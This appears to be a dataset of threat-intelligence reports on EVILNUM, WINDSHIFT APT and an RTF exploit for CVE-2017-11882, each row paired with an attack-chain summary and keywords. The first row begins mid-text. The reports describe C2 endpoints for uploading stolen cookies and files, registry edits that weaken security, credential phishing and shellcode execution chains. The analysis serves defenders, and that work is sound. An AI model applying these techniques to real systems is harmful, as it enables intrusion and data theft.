REFNAME + ""&user="" + userName Registers the agent with the C2 and obtain unique identifier ● ""view.php"", ""id="" + id); Get commands from the C2 ● ""cookies.php?id=""+id Upload harvested cookies to the C2 ● ""DOWNLOAD_FILE.php"".toLowerCase(), ""FILE-URL="".toLowerCase() + fileURL Download file from C2 then place in tmp and appData folders ● ""send.php?id=""+id, filePath, ""uploaded_file"" Upload file from infected host to C2 ● ""upload.php?id=""+id, sctFile, ""uploaded_file"" obtain windows script component from from C2, then store it “878478ddd3.TMP”PersistenceAs we described, the agent will persist through a reboot by adding a registry key. This is the same technique that was used in the 2.0 version. One notable feature is that the actor added logic to modify the registry key location, based on the antivirus product that was detected during the enumeration phrase. In the previous version, it would only specify what to do when BitDefender was installed on the host. The new version added functionality to account for Avast. If either one of those two antivirus specific products were detected it created a registry key at: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\. If there is no antivirus product detected - or something other than BitDefender and Avast - it will create a registry key at: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows.Both keys will then run a shortcut file specified at the path: ""C:\\Users\\admin\\AppData\\Roaming\\Microsoft\\Credentials\\MediaPlayer\\MediaManager\\Media.lnk"".This shortcut file maps to the media.js file, which contains a copy of the core agent. This set of registry persistence modifications are stored in a file named media.reg.The second registry modification file, mediaIE.reg, is the same file that has been used since version 1 of EVILNUM. These registry modifications appear to have remained consistent with the newest iteration versions. The modifications are intended to weaken the security of the host machine. For example - one modification removes the “no protect mode” banner, potentially luring victims into a false sense of security. Another example is the removal of a feature of CCleaner that clears data downloaded from browsers, this is likely meant to ensure downloaded scripts or tools were not removed. The registry keys and modified parameters are listed below. ● HKEY_CURRENT_USER\\Control Panel\\Cursors ""AppStarting""=hex(2):25,00,53,00,79,00,73,00,74,00,65,00,6d,00,52,00,6f,00,6f,00,74,00,25,00,5c,00,63,00,75,00,72,00,73,00,6f,00,72,00,73,00,5c,00,6 This decodes to “%.S.y.s.t.e.m.R.o.o.t.%.\.c.u.r.s.o.r.s.\.a.e.r.o._.a.r.r.o.w c.u.r…” ● HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Main ""Check_Associations""=no ""NoProtectedModeBanner""=dword:00000001 ""IE10RunOncePerInstallCompleted""=dword:00000001 ● HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Recovery “AutoRecover""=dword:00000002 ● HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\PhishingFilter EnabledV9""=dword:00000001\r\n\r\nurl Blog: Phantom in the Command Shell● HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\BrowserEmulation ""MSCompatibilityMode""=dword:00000001 ● HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ Advanced “EnableBalloonTips""=dword:00000000 ● HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings “GlobalUserOffline""=dword:00000000 ● HKEY_CURRENT_USER\\Software\\Piriform\\CCleaner “BrowserMonitoring""=-""(Mon)3001\"" ● HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3 ""2500""=dword:00000003ConclusionThe Phantom in the Command Shell campaign shows that the threat actors behind the EVILNUM malware family are constantly advancing their techniques as they continue to focus their efforts on the global banking/financial system. The differences between the 3.6 and 4.0 variants appear to be trivial and do not affect functionality.This group has been targeting the financial sector since 2018 and has achieved success due to their ability to use innovative methods to stay ahead of defensive measures, such as the use of javascript-based agents instead of relying upon more commonly used methods such as executable files. They have continued to evolve this agent by modifying the location of certain files to avoid detection by specific antivirus products and changing communications patterns when certain products are being employed. They created an elaborate command and control retrieval tactic by embedding instructions to use well known platforms, in order to bypass detection. They also configured the agent to use different C2 nodes depending on the security products used by the host machine.One possible way to protect against this threat, is to disable Microsoft shortcut files on high risk machines that routinely interact with untrusted parties. These high risk machines should also be segmented within the network to impede attackers' ability to spread laterally if they were compromised. We recommend routinely monitoring network logs to check for abnormal connections to IP addresses associated with virtual private servers.Prevailion has shared our findings with Cyber Threat Alliance members. The CTA uses this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. For more information on the Cyber Threat Alliance, visit www.cyberthreatalliance.org.Indicators of CompromiseGDrive URLs hxxps://drive[.]google[.]com/uc?auth_user=0&id=1KjJy7FCn-4IN7rsOSwWmSab3xVfY-wNn&export=download hxxps://docs[.]google[.]com/uc?authuser=0&id=1TROQjDFvR1pw7QckQq1TUVnOYUK6tR6Q&export=downloadZip Files Javascript agent version 4.0 Javascript agent version 3.5 appData + \\Microsoft\\Credentials\\MediaPlayer\\MediaManager\\ appData + \\Microsoft\\Credentials\\MediaPlayer\\UtilitiesLog\\C2 Retrieval URLs hxxps://gitlab[.]com/bliblobla123/testingtesting/-/raw/master/README.md hxxps://www.digitalpoint[.]com/members/bliblobla.943007/ hxxps://gitlab[.]com/jhondeer123/test/raw/master/README.md hxxps://www.digitalpoint[.]com/members/johndeer123.923670/ hxxps://gitlab[.]com/jhondeer123/test/raw/master/test.pyCommand and Control Node hxxp://139.28.37[.]63 hxxp://185.62.190[.]89 hxxp://185.62.190[.]218MITRE ATT&CK Framework MappingTacticTechniqueInitial AccessSpear Phishing Link (T1192)ExecutionPersistentUser Execution (T1204)Registry Run Keys / Startup Folder (T1060)Defensive EvasionTimestomping (T1099), Indicator Removal from host (T1070), Modify Registry (T1112), Hidden Window (T1143), rundll32 (T1085),Credential AccessSteal Web Session Cookie (T1539)CollectionData from Local System (T1005), Data Staged (T1074)Command & Control Commonly used port (T1043), Web service (T1102),Remote File copy (T1105)ExfiltrationExfiltration Over Command and Control Channel (T1041)url ","1. Victims receive links to compressed archives hosted on Google Drive containing shortcut files masquerading as JPEGs or PDFs. 2. When the shortcuts are opened, they execute a command to extract and run a Javascript agent. 3. The agent gathers system info and checks for antivirus software. 4. It retrieves its C2 server from hidden web pages on GitLab and DigitalPoint. 5. The agent communicates with the C2 via HTTP to upload/download files, run commands, harvest cookies, and run scripts. 6. The agent persists by adding registry run keys. 7. It also modifies the registry to weaken security settings in IE and disable certain antivirus protections. ",valid_95,"['victims', 'links', 'host', 'google', 'shortcut files', 'JPEGs', 'PDFs', 'Javascript', 'the agent', 'id', 'Gitlab', 'DigitalPoint', 'the C2', 'HTTP', 'Upload', 'download files', 'commands', 'cookies', 'scripts', 'keys', 'the registry', 'security', 'protections']",victims; links; host; google; shortcut files; JPEGs; PDFs; Javascript; the agent; id; Gitlab; DigitalPoint; the C2; HTTP; Upload; download files; commands; cookies; scripts; keys; the registry; security; protections.
"IN THE TRAILS OF WINDSHIFT APTTaha K.– Head of Malware Research Labs, Dark Matter LLCCONTENTSPART I: APT MYTHS & DEFINITIONSPART II: WHY AND HOW WINDSHIFT IS DIFFERENT?PART III: WINDSHIFT APT – MODUS OPERANDI (MO)PART IV: WINDSHIFT APT TOOLSET: MAC OS, WINDOWS MALWARE.PART V: ATTRIBUTION, WHO’S BEHIND WINDSHIFT APT?PART VI: CONCLUSIONSLITTLE BIT ABOUT ME• Malware RE for the last decade • Areas of interests:• Tracking APT’s and reversing their tools and MO’s. • Cyber crime investigations involving credit card fraud and bank cyber heists.• My background: I worked at FireEye Labs, and Symantec as Senior Malware reverseengineer.• Currently I work for Dark Matter LLC, as Head of malware research labs • MSCS and MBA from l’Ecole pour l’informatique et les techniques avancees, Paris - FranceIAPT MYTHS AND DEFINITIONSPART I: APT MYTHS AND DEFINITIONS• Does APT always means Advanced?• Case scenario: A target using unpatched Windows XP with no AV.– A very advanced toolset would be an overkill and comes with an unnecessary toolsetexposure, whilst a simple toolset will get the job done most of the times.– Modern APT’s, Re-use of available tools, think copy-cat, evading attribution. – Simplicity always wins over complexity. Especially when time frames are shortsand/or budgets are limited.PART I: APT MYTHS AND DEFINITIONS• How to measure an advanced APT?EvasionExfiltrationCounter measuresStealthOPSECEffectivenessIntelSuccessRateReachNoiseDetectionPredictabilityUniquenessAdaptabilityPersistencePART I: APT MYTHS AND DEFINITIONS• Public and most known “Middle-East” APT’s, based on public feeds:• GREENBUG • … • Up-to-date Middle-East APT OSINT data can be found here:• url I: APT MYTHS AND DEFINITIONS • Most of them rely on open-source tools:• Empire, Metasploit, Mimikatz, invoke-obfuscation, PsExec… • Minor some customization: strings replacements, code refractoring, • Sometimes relying and re-using low commodity malware:• RATs: NANOCORE, NETWIRE, njRAT, • OR build copy-pasta Android malware, • Usually copy-cat actors, unless some of them developed custom basic hack tools:• POWERSTATS, ISMAGENT, MICROSPIA, • Then they unlock the glorifying life-time “APT” attribution.#UnlockyourAPTTagPART I: APT MYTHS AND DEFINITIONS • Example of OilRig custom x64 Mimikatz:• Original Mimikatz x64 version have 1779 functions in total • OilRig modified Mimikatz have only 660 functions in total • Based on mimikatz version 0.1 • Have all the strings changedPART I: APT MYTHS AND DEFINITIONS • String changes for the OilRIG custom x64 Mimikatz:PART I: APT MYTHS AND DEFINITIONS • String changes for the OilRIG custom x64 Mimikatz:IIWHY AND HOW WINDSHIFT APT IS DIFFERENT?PART II: WHY AND HOW WINDSHIFT IS DIFFERENT?Pure Intelligence and Cyber espionage actor -> mostly active surveillanceIt’s been there for a while, and never got popped.It’s a long term non-attributable APT.• • Versatile, sophisticated and unpredictable Spear phishing attacks •They Re-use your favorite APT malware (and Infrastructures): • aka Hacking other APT actors• Very rarely directly engage targets with malware :• 2 attempts in 2017, very specific individuals. • 3 attempts in 2018, again very specific individuals.•They are ONLY after specific individuals. Rarely targets corporate environments. This what helped them staying under the radar for years.IIIWINDSHIFT APT – MODUS OPERANDI (MO)PART III: WINDSHIFT APT – MODUS OPERANDI (MO)• Phase 1: RECON – phase 1 duration 1-2 years• Via maintained fake personas on different social platforms:– Linkedin, Facebook, Twitter, Instagram, Google Plus.• Sending Friend Requests, engaging a conversation, to getidentifiable information, emails, phone numbers, friends contacts• Through social media mobile apps:– Example of such apps, phonebooks, stealing contact list,emails and SMS contents url identifies-app-stealing-personal-information/PART III: WINDSHIFT APT – MODUS OPERANDI (MO)• Phase 1: RECON – phase 1 duration 1-2 years• Example of fake online persona Asalah linked to WINDSHIFT APT:أﺻﺎﻟﺔآلﺳﻣﯾﺣﺔ() Al SameehaPART III: WINDSHIFT APT – MODUS OPERANDI (MO)• Twitter OSINT 101:• Legitimate Twitter account vs APT maintained Twitter Account(Weekly Activity) – using tweets_analyzer.py tool -APT maintained Twitter account: @aheemaslahalasaPART III: WINDSHIFT APT – MODUS OPERANDI (MO)• Phase 2: RECON – phase 2 – duration 6 months – 1 year• Long term monitoring of targets via benign emails:– Click habits, subjects of interests – Geo locating targets + Type of computer target uses (via User-Agent) – Email click rate – Usage of mailing lists, sending daily emails: duplicating content of local media• Building a sort of content habit and relationship with the target over time.=> increasing click rates, preparing the targets for the next phases.PART III: WINDSHIFT APT – MODUS OPERANDI (MO)• Phase 2: RECON – phase 2 – duration 6 months – 1 year– Benign email, example of Khaleej times content duplication, link pointing to legitKhaleej times as well:PART III: WINDSHIFT APT – MODUS OPERANDI (MO)• Phase 2: RECON – phase 2 – duration 6 months – 1 year– From the email source we found Tracking via Wasmyemailread[.]com:Also tracking via ifread[.]comPART III: WINDSHIFT APT – MODUS OPERANDI (MO)• Phase 3: Credential harvesting, duration 1 day• Sending emails mimicking legit password recovery or password reset of following providers :– Targeting personal emails : Gmail , Apple iCloud, Etisalat (main ISP in UAE) – Targeting professional emails: OWA outlook• Send SMS redirecting to a credential harvesting page. • Domain typo squatting • Domains resolves only 1 day during the attack then shutdown. • Anonymous domains registered with freenom.com for free: .ml, .tk, .ga. gq • Also domains registered with Internet BS, Namecheap, with Whois Privacy Guard • Credential harvesting landing pages are using HTTPS : free SSL certificates with let’s encrypt, orCOMODO Free SSL PART III: WINDSHIFT APT – MODUS OPERANDI (MO)• Phase 3: Credential harvesting, duration 1 day• OWA harvesting attempt:PART III: WINDSHIFT APT – MODUS OPERANDI (MO)• Phase 3: Credential harvesting, duration 1 day• Apple ID harvesting attempt via SMS and Emails :PART III: WINDSHIFT APT – MODUS OPERANDI (MO)• Phase 3: Credential harvesting, duration 1 day• SMS targeting Etisalat Users:PART III: WINDSHIFT APT – MODUS OPERANDI (MO)• Phase 3: Credential harvesting, duration 1 day• Gmail harvesting attempt:PART III: WINDSHIFT APT – MODUS OPERANDI (MO)• Phase 4: Hacking targets, 1 or twice per year• This phase usually happens if Phase 3 was unsuccessful after many attempts. Itis the last resort phase.• Infection vector: Emails (related to previous interaction emails of phase 2) having link to a drive by download delivering malware. Or emails having a direct malware attachment, usually within an archive.• Weaponize and re-use malware from different threat actors. • Re-use command and control infrastructure from other groups • Real separation between spear phishing infrastructure and malware C2infrastructure, to avoid attribution, suspicions and takedowns PART III: WINDSHIFT APT – MODUS OPERANDI (MO)• Below is the separation of WINDSHIFT APT C&C and spear phishinginfrastructures:PART III: WINDSHIFT APT – MODUS OPERANDI (MO)• Phase 5 : Disappear• Shutting the domain names and all related information for months • Switching to other spear phishing infrastructures • Continuously getting more access to new infrastructures:– Hacking – Renting infrastructures – purchasing new access from VPS resellers (bitcoin), bullet proof hosting providers.• Repointing domains to new infrastructures • Getting access to more malware, and more C2 infrastructures and maintain the accessuntil flaggedPART III: WINDSHIFT APT – MODUS OPERANDI (MO)• Phase 5 : Disappear • Example of OWA spear phishing domain : on January 2018, webmail-badirah-ae.html-5.me moving from WILDCARD-UK Unlimited to Bodis LLC :Bodis LLC is known to be linked to Dark Hotel and to many others:IVWINDSHIFT APT – TOOL-SETPART IV: WINDSHIFT APT – TOOL-SET• Current Tool-set by chronological order, mostly cyber espionagetools, still under on-going development: Dark Matter Code Target OS WINDTAIL.AFirst seen Jan - 2017macOSWINDTAIL.BmacOSWINDTAIL.CmacOSWINDTAPEmacOSJan - 2018Jan - 2018Jan - 2018WINDDROP - Downloader of a unknown malwarePART IV: WINDSHIFT TOOL-SET - WINDTAIL.A• WINDTAIL.A : Signed macOS backdoor exfiltrating files having thefollowing extensions: .txt .pdf .doc .docx .ppt .pptx .db .rtf .xls .xlsx• Persists via LoginItems • Strings encrypted with AES-256-ECB and encoded with Base64.AES key hardcoded in the sample:PART IV: WINDSHIFT TOOL-SET - WINDTAIL.A• First apparition in January 2017• Infection vector via spear phishing emails, pointing to a speciallycrafted webpage. The targeted emails were pointing victims to access a VIP contacts list:PART IV: WINDSHIFT TOOL-SET - WINDTAIL.APART IV: WINDSHIFT TOOL-SET - WINDTAIL.A• The specially crafted webpage will download a file VVIP_Contacts.zip, and willcall a URL scheme: openurl2622015://a:PART IV: WINDSHIFT TOOL-SET - WINDTAIL.A• The custom URL scheme of VVIP_Contacts.app contained a typo “missing theletter L”• Which results in the failure of this first targeted attack. • Nevertheless, attackers gave a backdoor a realistic look by mimicking an Excelsheet icon, and most of the unaware victims will fall in this second trap by double clicking on the app to access the VIP contact listPART IV: WINDSHIFT TOOL-SET - WINDTAIL.A• Demo #1 :• How a custom URL scheme is added to the LaunchServices database (via a filedownload, network shares, etc )• How to trigger the custom URL scheme using a specifically crafted webpage • Weakness of the attacker controlled user consent pop-up • Lateral movement: how WINDTAIL.A infect any MacOS via network shares • 1-click Malware infection and persistencePART IV: WINDSHIFT TOOL-SET - WINDTAIL.A• Rewrite ? of “Hack Back” aka “KitM OSX” , 2012 surveillance malware. We find the exactsame helper function re-used (reading last 8-bytes of a specified file)• Signed with new Developer ID certificate • Weaponized with AES-256-ECB • Sign of code re-use -> • Same C&C servers IP from 2012 •“Hack Back” aka “KitM OSX” is linked to:• Operation Hangover / Appin Security• Indian APT group from 2012PART IV: WINDSHIFT TOOL-SET - WINDTAIL.B• WINDTAIL.B, first apparition in January 2018 • Infection vector is with direct email attachmentsPART IV: WINDSHIFT TOOL-SET - WINDTAIL.B• Weaponized with AES-256-ECB • Full rewrite of WINDTAIL.A (appeared exactly one year later after WINDTAIL.A) • Additionally downloads and execute WINDTAPE (see next slides) • Weird similarities with Komplex OSX Trojan from Sofacy APT (aka APT 28): • Testing if www.google.com is available using the Reachability framework• Komplex OSX communicated with C2 hosted via AltusHost B.V a Netherlands serviceprovider. AltusHost B.V is linked to several group and majorly used by Russian and Indian APT groups:PART IV: WINDSHIFT TOOL-SET - WINDTAIL.B • WINDTAPE, is the a second stage downloaded by WINDTAIL.B •The below PCAP was recorded from our macOS Honeypot:PART IV: WINDSHIFT TOOL-SET - WINDTAPE• Main purpose :• Taking a Screenshot of the current Desktop • Sending the Screenshot to the C2 • Removing the Screenshot • Repeat every 5 seconds••Using KSReachability framework to determine if the infected hosts is connected to the internet, KSReachability code is originally cloned from this GIT repo: url (We found the exact same Credits.rtf left inside WINDTAIL.A)Function names in Farisi : • Goli means Flower/Rose • Namac means SaltPART IV: WINDSHIFT TOOL-SET - WINDTAPE•String encryption: • The encryption used is DES with a hardcoded Key and IV. • CCCrypt is used, so I wrote the decryption routine in objective-C as following:PART IV: WINDSHIFT TOOL-SET - WINDTAPE• Demo #2 :• WIDTAPE taking screenshots + Exfiltrating the captured images tothe C&CPART IV: WINDSHIFT TOOL-SET - WINDTAPE•Final Remarks on the encryption keys used in WINDTAIL.A/B and WINDTAPE • The encryption keys are hardcoded in the sample in the UTF-16LE format:PART IV: WINDSHIFT TOOL-SET - WINDDROP• WINDDROP, a Windows dropper, first appeared in May 2018, found by pivoting over the C2 through an online malware repository. This sample shares the same C&C server with the other macOS backdoors. It starts by sending information about the infected hosts :PART IV: WINDSHIFT TOOL-SET - WINDROP• Downloads a second stage backdoor drop.txt• Pass the execution to the a second still unidentified backdoor. No details about this secondstage backdoor found yet, the file was removed from the server.PART IV: WINDSHIFT TOOL-SET - WINDROP• Stack strings are encrypted, tools like FLOSS wont be able decode them:VS• Configuration strings are encoded:PART IV: WINDSHIFT TOOL-SET - WINDROP• All the decryption is performed via a standalone decryption function:PART IV: WINDSHIFT TOOL-SET - WINDROP• Can it be decrypted using emulation ? Yes. • emulation using Radare2 is possible, see:•url• Can we do it with Binary Ninja?PART IV: WINDSHIFT TOOL-SET - WINDROP• Demo#3: Decrypt WINDROP encrypted strings using:• The Unicorn engine• Binary Ninja• Ripr plugin• And some ninja skills PART IV: WINDSHIFT TOOL-SET - WINDROP • WINDROP strings can be decrypted via x86 emulation :VATTRIBUTION, WHO’S BEHIND WINDSHIFT APT?PART V: ATTRIBUTION, WHO’S BEHIND WINDSHIFT APT?• An advanced APT hacked into Appin servers, or purchased their source code:• An APT hacked into Operation Hangover and got access to “KitM” and “HackBack” malware source code : • Since not activity was recorded between 2012 and 2017 moreover Appin wasshutdown during that time.• Suddenly variants of malware appeared in 2017 all signed with developer id’shaving emails very similar BAHAMUT APT MO’s: example warren82port@mail.com was used to sign WINDTAIL malware.• BAHAMUT APT, is an obscure group tracked by Bellingcat showing a verysimilar email address composition : usually English first name, last name, and a number @ mail (.com, .ru) as well as VERY similar MO’s:PART V: ATTRIBUTION, WHO’S BEHIND WINDSHIFT APT?BAHAMUT APTWINDSHIFT APTsource: Bellingcatsource: Dark MatterPART V: ATTRIBUTION, WHO’S BEHIND WINDSHIFT APT?BAHAMUT APTWINDSHIFT APTsource: Bellingcatsource: Dark MatterPART V: ATTRIBUTION, WHO’S BEHIND WINDSHIFT APT?BAHAMUT APTWINDSHIFT APTsource: Bellingcatsource: Dark MatterPART V: ATTRIBUTION, WHO’S BEHIND WINDSHIFT APT?BAHAMUT APTWINDSHIFT APTEmail: warren82port@mail.comWarren Portman Apple Developer ID: 9S442G74FHEmail: ?? Caren Van Apple Developer ID: 4F9G49SUXBsource: Bellingcatsource: Dark MatterVICONCLUSIONSPART VI: CONCLUSIONS• Appin Security was highly likely either targeted by an advanced APT group or tools stolen byrogue employee or tools (malware, servers access ) were sold to a third party.• Fact 1: Appin Security previously reported tools and infrastructures are today re-used to covertlyhack into governments.• Fact 2: We found overlaps with known existing APT actors:– MO’s (including: Domain registration, phishing emails and SMS’s) : BAHAMUT APT,Fancy Bear– Infrastructure used: BAHAMUT APT, Fancy Bear – Malware coding practices similarities: SOFACY – VPS providers: SOFACY, Fancy Bear, CARBANAK, DARK HOTEL, MORPHO, BAHAMUT – Passive DNS data: overlap with BAHAMUT, SOFACY• Fact 3: WINDSHIFT APT are currently targeting government using Appin Security tools.REFERENCES• •url url url url url url url url url url url url url url url url url url url url url url aa40c9e08852 url url url url url url YOU "," 1. Phase 1 - Reconnaissance: WINDSHIFT builds fake personas on social media over 1-2 years to gather information on targets and befriend them. 2. Phase 2 - Monitoring: WINDSHIFT sends benign emails with tracking to targets over 6-12 months to monitor behavior and increase trust. 3. Phase 3 - Credential Harvesting: WINDSHIFT sends phishing emails or SMS impersonating services like Gmail and iCloud to steal credentials, with domains active for only 1 day. 4. Phase 4 - Malware Infection: If phishing fails, WINDSHIFT sends emails with malware attachments or links to infect target systems. This is used rarely and sparingly. 5. Phase 5 - Disappear: WINDSHIFT switches infrastructure and acquires new tools to avoid detection, going quiet for months between campaigns. ",valid_74,"['phase', 'RECON', 'WINDSHIFT', 'fake personas', 'social media', '1-2 years', 'information', 'targets', 'benign emails', 'Tracking', 'months', 'Credential harvesting', 'phishing emails', 'SMS', 'services', 'Gmail', 'iCloud', 'Domains', 'IV', 'only 1 day', 'Malware Infection', 'link', 'use', 'Disappear', 'Infrastructure', 'tools', 'detection']",phase; RECON; WINDSHIFT; fake personas; social media; 1-2 years; information; targets; benign emails; Tracking; months; Credential harvesting; phishing emails; SMS; services; Gmail; iCloud; Domains; IV; only 1 day; Malware Infection; link; use; Disappear; Infrastructure; tools; detection.
"Malicious document targets Vietnamese officialsmedium.com/@Sebdraven/malicious-document-targets-vietnamese-officials-acb3b9d8b80aSebdravenJuly 31, 2018After our investigation of APT SideWinder, we’ve done a yara rule for hunting RTF document exploiting the CVE-2017–11882.We found a document written in Vietnamese dealing with a summary about differents projects in the district Hải Châu of Đà Nẵng.RTF documentIn this article, we’ll detail the infection chains and the infrastructures of the attackers and the TTPs of this campaign.The infrastructures and TTPs during this campaign seem to the Chinese hacking group 1937CN.Infection chainsJoe sandbox has a good representation of the behaviour of the infection.1/22This rtf document is really malicious and it exploits the equation vulnerability to write two files in the system:1. A dll named RasTls.dll 2. A executable file named dascgosrky.exeThis document is interesting to analyze so let’go !RTF analysisWith rtfobj, we found three ole objects in the document:two non well formed ole object and a third named package ole object.The package ole object is used to write a file in the disk when the document is opened at the destination described by the ole object.That’s why, there is a path and a name in the ole object.2/22Package OLE ObjectThis technique is used to execute code like sct file to download an executable on the operating system. McAfee labs has detailed all this stuff with sct file: url security-concerns/Many attackers use it in the wild because it’ very easy to use and it’ supported by the office software with RTF files.So, in our case, a file named 8.t is dropped on %TMP% folder.If we check it, it’s clearly encrypted.3/228.t encryptedThe others object ole seem to the exploit of CVE-2017–11882.4/22Equation Ole ObjectAt the end of the object ole, we have differents API functions to make a runPE.Another interesting thing is this string at the begin of the object: 7e079a2524fa63a55fbcfeString found in many exploits of CVE-2017–11882We have the same string used by APT SideWinder in the equation object ole.It’s the same toolset to create the malicious document.5/22So now, we have to debug the malicious document to find how the file 8.t is used and find this runPE.Debugging of the shellcodeAt the start of the analysis, we think the process EQNEDT32.exe is created by Winword.exe using the function CreateProcess. So we decided to set a breakpoint at the call of his function.But EQNEDT32.exe is invoked by Winword.exe using COM Object. It’s not CreateProcess that used and Winword.exe is not the parent process of EQNEDT32.exe. So we have to attach the debugger when EQNEDT32.exe is launched.For that, we used a technique named Image File Execution Options that was documented by Microsoft. url options-ifeo/We create a key EQNEDT32.exe.RegistryHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution OptionsAnd we set a value string for launching the debugger when EQNEDT32.exe is executed and attaching the debugger to the process .Value to set the debuuger when EQNEDT32.exe is executedWhen we open the rtf document, Winword is launched and EQNEDT32.exe also.Winword process6/22EQNEDT32.exe process attached by the debuggerAnd the debugger is attached at the entrypoint of EQNEDT32.exe.We check if it’s 8.t is correctly created in the %TMP% folder.8.t dropped on diskNow we set a breakpoint at the createFile to check if the shellcode of the exploit reads the file 8.t.CreateFile is called at call eqnedt32.41E5EE.The param of the path of file is pushed on the stack push dword ptr ss:[ebp-4].The shellcode uses CreateFile to the 8.t in the %TMP% folderSo now, we can return of the user code at the calling function.After a step into, we enter in the shellcode, the address space has changed:Shellcode of the exploitAfter CreateFile, GetFileSize is called to have the size of the file7/22Get the size of the fileAfter is Virtualloc, and it create a memory page at 1FD0000 (eax value)VirtualAlloc memory page to load 8.tAfter virtualAlloc, the memory page is pointed by EAXThe page allocatedReadFile is called:Readfile 8.tAnd 8.t is loaded at 1FD0000:8/228.t in memoryAnd the shellcode decrypts the 8.t file in memory at 0066C82A.The loop of decryption is a xoring with different manipulations on the decryption key.At the start of the decryption the key is set to 7BF48E63.Decryption loopAnd the xor is made after key manipulation.Set the decryption key in EAXIf we check the destination of the result of the xoring (here edx + ebx), we find 01FD0000 where 8.t is loaded.After two step of the loop, we can see the magic number MZ set at the begin of memory section.MZ magic numberAt the end of the decryption loop, we have a PE in memory at 01FD0000.the file 8.t has been decrypted.9/228.t fully decryptedThen, the shellcode uses the VirtualAlloc and create a memory page at 02070000.And the new PE at 01FD0000 is copied at this address.the PE decrypted is copied in the new memory pageAfter GetModuleFileNameA is called to have the path of EQNEDT32.exeAnd EQNEDT32.exe is forked in suspend status by a CreateProcess and the shellcode overwrite it by the PE at the address 02070000Fork of EQNEDT32.exeOverwritting of EQNEDT32.exe10/22Stack used by NTWriteVirtualMemoryAnd the shellcode does a ResumeThread to launch the new PE.So, We’ve found all API Calls in the object ole at the beginning and we have a runPE to launch the new EQNEDT32.exe overwritten.Analysing the fork of EQNEDT32.exeWe know that this process has to create on disk two files following the Joe SandBox Analysis:A dll named RasTls.dll A executable file named dascgosrky.exeIf we dump EQNEDT32.exe and we put in IDA, we found quickly the function that drops the files on disk (sub_00401150) renamed dropFiles.DropFiles FucntionAnd at the start of this functions, we have a loop with a xor.11/22Second loop of decryptionAnd just after we have a call of the decompression function.Decompression function used zlibThe function dropFiles is called twice by the sub_4012D0.Drop the dll and the executable12/22If we check the call graph, DropFiles is called only by the function sub_4012D0.Functions using DropFiles functionSo we set a breakpoint on CreateFile because at each execution, EQNEDT32.exe starts by CreateFile onstaticcache.dat.Breakpoint to createfileAnd we return at the user code to set a new breakpoint to check the static analysis.So we set a breakpoint at 0040159A when DropFiles is called.Breakpoint to the first call of DropFilesAnd now we can analyse the second loop of decryption.The first step is the initialization of the decryption function.13/22Set for the second loop encryptionAnd after we find the xor and store the result in esi+eax.Decryption loopIn the first step of the decryption loop, the result is written to 411BC0 in the address space of EQNEDT32.exe.Before the decryptionAfter tree loops, we obtains the header of zlib compressed object.After the decryptionAnd at the memory page 021E0000, a PE is decompressed.Page memory allocated to store the dll14/22After decompressionAnd after the file is created with the following path: L”C:\\Users\\IEUser\\AppData\\Roaming\\Microsoft\\Windows\\Network Shortcuts\\RasTls.dll”Stored by ebx.DropFiles is called a twice to decrypt and decompress the executable file.The offset where store the file is 00434EF8 and the pe decompressed is stored at 025D002015/22Decryption of the executable dascgosrky.exeAnd the path of the new file is : ebx=005DA228 L”C:\\Users\\IEUser\\AppData\\Roaming\\Microsoft\\Windows\\Network Shortcuts\\dascgosrky.exe”So we have two files in networks shortcuts of Windows.Files drops on diskdll hijackingDascgosrky.exe is a legit and trusted software develop by Symantec.16/22To load the library RasTls.dll, the executable calls LoadLibrary and GetProcaddress in sub_401940 to execute the malicious functions17/22Dascgosrky.exe loading the malicious18/22The original fileIf we check the exports in IDA, we just have a dllentrypoint. The dll is executed like this.We’ll analyse the RAT in the second Part.Infrastructure of AttackersThe domain contacted is wouderfulu.impresstravel.ga and this domain resolved on organizations.url vietnamese-organizations.html20/22For Fortinet is the Chinese hacking group 1937CN.If we compare the TTPs, it’s really similar. They used RTFs to make the intrusion and dll hijacking to load the real payload.And the name of domains are really similar between the campaings.The second one is:Cat.toonganuh.com is a subdomain of tooganuh.com recorded by florence1972@scryptmail.comConclusionThe Chinese hacking group 1937CN continues to target Vietnam officials with the same TTPs with a refreshing on the tools used. The toolset used by this group to create RTF malicious document has the same properpy of the SideWinder.I want to thank my buddies on “Zone de Confort”. It’s with this dreamteam, I can finalize correctly this analyses.In the second part, we analyze the RAT using in this campaign. Or if another reverse can make that, I’ll paid a beer ;)IOCs for the paper:domains: dn.dulichbiendao.org gateway.vietbaotinmoi.comweb.thoitietvietnam.org hn.dulichbiendao.org halong.dulichculao.com cat.toonganuh.com new.sggpnews.com dulichculao.com coco.sodexoa.com. thoitiet.malware-sinkhole.net wouderfulu.impresstravel.ga toonganuh.com coco.sodexoa.comIPs: ", 1. Malicious RTF document is sent to Vietnamese government officials via spearphishing. 2. RTF exploit CVE-2017-11882 to execute shellcode on target system. 3. Shellcode decrypts PE file EQNEDT32.exe and executes it. 4. EQNEDT32.exe drops RasTls.dll and dascgosrky.exe to disk. 5. Dascgosrky.exe loads RasTls.dll via DLL hijacking. 6. RasTls.dll executes final PlugX RAT payload. 7. PlugX allows access and data exfiltration by Chinese threat actor 1937CN. ,valid_75,"['RTF document', 'Vietnamese', 'PE', 'Shellcode', 'decrypt', 'file', 'EQNEDT32.exe', 'RasTls.dll A', 'Dascgosrky.exe', 'disk', 'A dll', 'DLL hijacking', 'RAT', 'Chinese', '1937CN']",RTF document; Vietnamese; PE; Shellcode; decrypt; file; EQNEDT32.exe; RasTls.dll A; Dascgosrky.exe; disk; A dll; DLL hijacking; RAT; Chinese; 1937CN.
